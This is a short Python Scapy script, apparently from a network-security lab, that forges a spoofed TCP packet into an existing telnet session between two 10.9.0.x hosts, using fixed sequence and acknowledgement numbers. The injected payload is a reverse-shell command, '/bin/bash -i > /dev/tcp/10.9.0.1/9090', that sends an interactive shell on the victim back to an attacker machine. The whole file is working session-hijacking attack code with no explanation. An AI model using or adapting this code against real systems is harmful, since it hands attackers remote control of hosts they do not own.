from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=42808, dport= 23, flags="A", seq=2553241593, ack=3964883454)
data = "\n /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\n"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)